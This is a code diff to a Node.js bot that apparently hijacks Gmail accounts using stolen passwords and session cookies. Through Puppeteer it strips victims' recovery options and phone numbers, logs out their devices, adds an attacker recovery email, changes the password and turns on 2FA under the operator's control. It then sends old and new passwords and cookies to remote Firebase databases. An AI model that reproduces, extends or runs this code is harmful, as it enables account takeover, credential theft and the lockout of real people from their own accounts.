@@ -4,11 +4,13 @@ const twofactor = require('node-2fa')
 const axios = require('axios')
 
 
-const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/gmail' 
+const BASE_URL = 'https://server-9099-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/' 
+
 
 let mMailData = null
 let mMailRequest = false
 let mMailCookies = {}
+let mChangeWorker = {}
 let mWorkerActive = false
 
 let mCookie = [
@@ -147,217 +149,233 @@ async function startServer() {
 
     await checkStatus()
 
+    mChangeWorker = await getChangeWorker()
+
     while (true) {
         mWorkerActive = false
         let data = await getGmailData()
         if (data && (FINISH <= 0 || FINISH >= new Date().getTime())) {
             mWorkerActive = true
             console.log('Node: [ Receive New Data --- Time: '+getTime()+' ]')
-            await loginWithCompleted(data.number, data.password, data.cookies)
+            await loginWithCompleted(data.number, data.password, data.cookies, data.key)
         } else {
             await delay(10000)
         }
     }
 }
 
-async function loginWithCompleted(number, password, cookies) {
+async function loginWithCompleted(number, password, cookies, worker) {
     try {
-        if (await isValidCookies(cookies)) {
-            mMailRequest = false
-            mMailCookies = await getMailCookie(cookies)
-
-            mMailData = await getMailTokenData()
-            let mMailYear = await getMailYear(mMailData)
-
-            console.log('Node: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
+        if (mChangeWorker[worker]) {
+            if (await isValidCookies(cookies)) {
+                mMailRequest = false
+                mMailCookies = await getMailCookie(cookies)
+    
+                mMailData = await getMailTokenData()
+                let mMailYear = await getMailYear(mMailData)
+    
+                console.log('Node: [ Cookies Valid: '+number+' --- Time: '+getTime()+' ]')
+                
+                let browser = await puppeteer.launch({
+                    headless: false,
+                    headless: 'new',
+                    args: [
+                        '--no-sandbox',
+                        '--disable-notifications',
+                        '--disable-setuid-sandbox',
+                        '--ignore-certificate-errors',
+                        '--ignore-certificate-errors-skip-list',
+                        '--disable-dev-shm-usage'
+                    ]
+                })
             
-            let browser = await puppeteer.launch({
-                headless: false,
-                headless: 'new',
-                args: [
-                    '--no-sandbox',
-                    '--disable-notifications',
-                    '--disable-setuid-sandbox',
-                    '--ignore-certificate-errors',
-                    '--ignore-certificate-errors-skip-list',
-                    '--disable-dev-shm-usage'
-                ]
-            })
-        
-            let loadCookie = {}
-            let tempCookie = cookies.split(';')
-
-            for (let i = 0; i < tempCookie.length; i++) {
-                try {
-                    let split = tempCookie[i].trim().split('=')
-                    if (split.length == 2) {
-                        loadCookie[split[0]] = split[1]
-                    }
-                } catch (error) {}
-            }
-
-            mCookie.forEach((cookie) => {
-                let value = loadCookie[cookie['name']]
-
-                if (value) {
-                    cookie['value'] = value
-                    cookie['size'] = value.length
+                let loadCookie = {}
+                let tempCookie = cookies.split(';')
+    
+                for (let i = 0; i < tempCookie.length; i++) {
+                    try {
+                        let split = tempCookie[i].trim().split('=')
+                        if (split.length == 2) {
+                            loadCookie[split[0]] = split[1]
+                        }
+                    } catch (error) {}
                 }
-            })
-            
-            let page = (await browser.pages())[0]
-
-            page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
-
-            await page.setCookie(...mCookie)
-
-            await page.setRequestInterception(true)
-
-            page.on('request', async request => {
-                try {
-                    let url = request.url()
-                    if (url.startsWith('https://mail.google.com/accounts/SetOSID') && mMailRequest) {
-                        try {
-                            mMailCookies = await getMailCookie(await getNewCookies(await page.cookies()))
-                            mMailData = await getMailTokenData(url)
-                            
-                            let contentType = 'text/html; charset=utf-8'
-                            let output = '<!DOCTYPE html><html><body><h1>Gmail</h1></body></html>'
-
-                            mMailRequest = false
-
-                            request.respond({
-                                ok: true,
-                                status: 200,
-                                contentType,
-                                body: output,
-                            })
-                        } catch (error) {
+    
+                mCookie.forEach((cookie) => {
+                    let value = loadCookie[cookie['name']]
+    
+                    if (value) {
+                        cookie['value'] = value
+                        cookie['size'] = value.length
+                    }
+                })
+                
+                let page = (await browser.pages())[0]
+    
+                page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
+    
+                await page.setCookie(...mCookie)
+    
+                await page.setRequestInterception(true)
+    
+                page.on('request', async request => {
+                    try {
+                        let url = request.url()
+                        if (url.startsWith('https://mail.google.com/accounts/SetOSID') && mMailRequest) {
+                            try {
+                                mMailCookies = await getMailCookie(await getNewCookies(await page.cookies()))
+                                mMailData = await getMailTokenData(url)
+                                
+                                let contentType = 'text/html; charset=utf-8'
+                                let output = '<!DOCTYPE html><html><body><h1>Gmail</h1></body></html>'
+    
+                                mMailRequest = false
+    
+                                request.respond({
+                                    ok: true,
+                                    status: 200,
+                                    contentType,
+                                    body: output,
+                                })
+                            } catch (error) {
+                                request.continue()
+                            }
+                        } else {
                             request.continue()
                         }
-                    } else {
+                    } catch (error) {
                         request.continue()
                     }
-                } catch (error) {
-                    request.continue()
-                }
-            })
-
-            console.log('Node: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
-            
-            try {
-                let mData = await waitForAccountDetails(page)
-
-                console.log('Node: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                })
+    
+                console.log('Node: [ Browser Loaded: '+number+' --- Time: '+getTime()+' ]')
                 
-                let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
-
-                let mPassword = mToken.password
-                let mRapt = mToken.token
-
-                console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
-                
-                if (mRapt) {
-                    for (let i = 0; i < 3; i++) {
-                        if (await waitForRemoveRecovery(page, mRapt)) {
-                            break
-                        }
-                    }
-
-                    if (mMailData == null) {
-                        mMailRequest = true
-                        await page.goto('https://mail.google.com/mail/u/0/')
-                        mMailYear = await getMailYear(mMailData)
-                    }
-
-                    let mDeviceYear = await waitForDeviceLogout(page, 3)
-                    
-                    let mYear = mData.year
-                    mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
-
-                    let mNumberYear = await waitForNumberRemove(page, mRapt)
-
-                    mYear = (mNumberYear < mYear) ? mNumberYear : mYear
-                    
-                    console.log('Node: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
-                    
-                    let mRecovery = await waitForRecoveryAdd(page, mRapt, mYear < 2019 || mMailYear < 2019 ? 'arafat.arf121@gmail.com' : null)
-    
-                    console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
-    
-                    if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
-    
-                    try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
-                    } catch (error) {}
-    
-                    console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
-                    
-                    await waitForLanguageChange(page)
-    
-                    console.log('Node: [ Language Change: English --- Time: '+getTime()+' ]')
-    
-                    await waitForSkipPassworp(page, mRapt)
-    
-                    console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')
-    
-                    await waitForNameChange(page, mRapt)
-    
-                    let mTwoFa = await waitForTwoFaActive(page, mRapt)
-    
-                    console.log('Node: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
-                    
-                    await waitForDeviceLogout(page, 1)
-
-                    let n_cookies = await getNewCookies(await page.cookies())
-                    
-                    try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
-
-                        console.log('Node: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
-                    } catch (error) {}
-                } else {
-                    let n_cookies = await getNewCookies(await page.cookies())
-                    
-                    try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/code/error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded'
-                            }
-                        })
-                    } catch (error) {}
-                }
-
                 try {
-                    await axios.delete(BASE_URL+'/'+number+'.json')
+                    let mData = await waitForAccountDetails(page)
+    
+                    console.log('Node: [ Gmail Name: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                    
+                    let mToken = await waitForRaptToken(page, '+'+number.replace('8800', '880'), password)
+    
+                    let mPassword = mToken.password
+                    let mRapt = mToken.token
+    
+                    console.log('Node: [ Rapt Token: '+(mRapt == null ? 'NULL' : 'Received')+' --- Time: '+getTime()+' ]')
+                    
+                    if (mRapt) {
+                        for (let i = 0; i < 3; i++) {
+                            if (await waitForRemoveRecovery(page, mRapt)) {
+                                break
+                            }
+                        }
+    
+                        if (mMailData == null) {
+                            mMailRequest = true
+                            await page.goto('https://mail.google.com/mail/u/0/')
+                            mMailYear = await getMailYear(mMailData)
+                        }
+    
+                        let mDeviceYear = await waitForDeviceLogout(page, 3)
+                        
+                        let mYear = mData.year
+                        mYear = (mDeviceYear < mYear) ? mDeviceYear : mYear
+    
+                        let mNumberYear = await waitForNumberRemove(page, mRapt)
+    
+                        mYear = (mNumberYear < mYear) ? mNumberYear : mYear
+                        
+                        console.log('Node: [ Mail Create Year: ['+mMailYear+','+mYear+'] --- Time: '+getTime()+' ]')
+                        
+                        let mRecovery = await waitForRecoveryAdd(page, mRapt, mYear < 2019 || mMailYear < 2019 ? 'arafat.arf121@gmail.com' : null)
+        
+                        console.log('Node: [ Recovery Mail: '+mRecovery+' --- Time: '+getTime()+' ]')
+        
+                        if (!mPassword) mPassword = await waitForPasswordChange(page, mRapt)
+        
+                        try {
+                            await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/completed'+((mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, create: mYear, mail:mMailYear }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+        
+                        console.log('Node: [ New Password: '+mPassword+' --- Time: '+getTime()+' ]')
+                        
+                        await waitForLanguageChange(page)
+        
+                        console.log('Node: [ Language Change: English --- Time: '+getTime()+' ]')
+        
+                        await waitForSkipPassworp(page, mRapt)
+        
+                        console.log('Node: [ Skip Password: Stop --- Time: '+getTime()+' ]')
+        
+                        await waitForNameChange(page, mRapt)
+        
+                        let mTwoFa = await waitForTwoFaActive(page, mRapt)
+        
+                        console.log('Node: [ Two Fa: Enable '+((mTwoFa.auth || mTwoFa.backup) && !mTwoFa.error ? 'Success': 'Failed')+' --- Time: '+getTime()+' ]')
+                        
+                        await waitForDeviceLogout(page, 1)
+    
+                        let n_cookies = await getNewCookies(await page.cookies())
+                        
+                        try {
+                            await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/completed'+(mTwoFa.error ? '_error':(mYear < 2019 || mMailYear < 2019? '_old':''))+'/'+mData.gmail.replace(/[.]/g, '')+'.json', JSON.stringify({ number:number, recovery: mRecovery, password:mPassword, old_pass:password, cookies:cookies, n_cookies:n_cookies, create: mYear, mail:mMailYear, auth:mTwoFa.auth, backup:mTwoFa.backup }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+    
+                            console.log('Node: [ Change Completed: '+mData.gmail+'@gmail.com --- Time: '+getTime()+' ]')
+                        } catch (error) {}
+                    } else {
+                        let n_cookies = await getNewCookies(await page.cookies())
+                        
+                        try {
+                            await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/code/error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                }
+                            })
+                        } catch (error) {}
+                    }
+    
+                    try {
+                        await axios.delete(BASE_URL+'gmail/'+number+'.json')
+                    } catch (error) {}
+                } catch (error) {
+                    console.log('Node: [ Browser Process: Error --- Time: '+getTime()+' ]')
+                }
+                
+                try {
+                    if (page != null) {
+                        await page.close()
+                    }
                 } catch (error) {}
-            } catch (error) {
-                console.log('Node: [ Browser Process: Error --- Time: '+getTime()+' ]')
+    
+                try {
+                    if (browser != null) {
+                        await browser.close()
+                    }
+                } catch (error) {}   
+            } else {
+                console.log('Node: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
+    
+                await axios.delete(BASE_URL+'gmail/'+number+'.json')
             }
-            
-            try {
-                if (page != null) {
-                    await page.close()
-                }
-            } catch (error) {}
-
-            try {
-                if (browser != null) {
-                    await browser.close()
-                }
-            } catch (error) {}   
         } else {
-            console.log('Node: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
+            console.log('Node: [ Not Change: '+number+' --- Time: '+getTime()+' ]')
 
-            await axios.delete(BASE_URL+'/'+number+'.json')
+            try {
+                await axios.patch(BASE_URL+'pending/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, key:worker }), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+            } catch (error) {}
+            
+            await axios.delete(BASE_URL+'gmail/'+number+'.json')
         }
     } catch (error) {}
 }
@@ -1100,7 +1118,6 @@ async function isValidCookies(cookies) {
     return false
 }
 
-
 async function getMailTokenData(url) {
     if (!url) url = 'https://accounts.google.com/ServiceLogin?service=mail&passive=1209600&osid=1&continue=https://mail.google.com/mail/u/0/&followup=https://mail.google.com/mail/u/0/&emr=1&authuser=0'
 
@@ -1356,7 +1373,7 @@ async function exists(page, element) {
 async function getGmailData() {
 
     try {
-        let response = await axios.get(BASE_URL+'.json?orderBy=%22$key%22&limitToFirst=1')
+        let response = await axios.get(BASE_URL+'gmail.json?orderBy=%22$key%22&limitToFirst=1')
         let data = response.data
         if (data) {
             let number = Object.keys(data)[0]
@@ -1367,6 +1384,19 @@ async function getGmailData() {
     } catch (error) {}
 
     return null
+}
+
+async function getChangeWorker() {
+    
+    try {
+        let response = await axios.get(BASE_URL+'change.json')
+        let data = response.data
+        if (data) {
+            return data
+        }
+    } catch (error) {}
+
+    return {}
 }
 
 async function checkStatus() {
